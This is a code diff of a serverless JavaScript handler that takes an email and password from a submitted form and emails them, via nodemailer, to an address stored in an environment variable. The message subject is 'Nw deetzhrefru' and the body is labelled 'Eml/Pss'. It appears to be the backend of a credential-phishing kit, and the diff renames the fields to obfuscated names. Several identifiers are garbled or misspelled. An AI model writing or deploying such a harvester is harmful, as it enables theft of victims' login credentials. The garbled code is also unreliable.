@@ -9,7 +9,7 @@ exports.handler = async (event) => {
 
     try {
         // 2. Parse the body
-        const { email, password } = JSON.parse(event.body);
+        const { emll, pss } = JSON.parse(event.body);
 
         // 3. Use the hardcoded credentials that worked locally
         const transporter = nodemailer.createTransport({
@@ -22,7 +22,7 @@ exports.handler = async (event) => {
 
         await transporter.sendMail({
             from: process.env.ELL_USS,
-            to: process.env.EMAIL_USS,
+            to: process.env.ELL_USS,
             subject: 'Nw deetzhrefru',
             text: `Eml: ${emll}\nPss: ${pss}`
         });
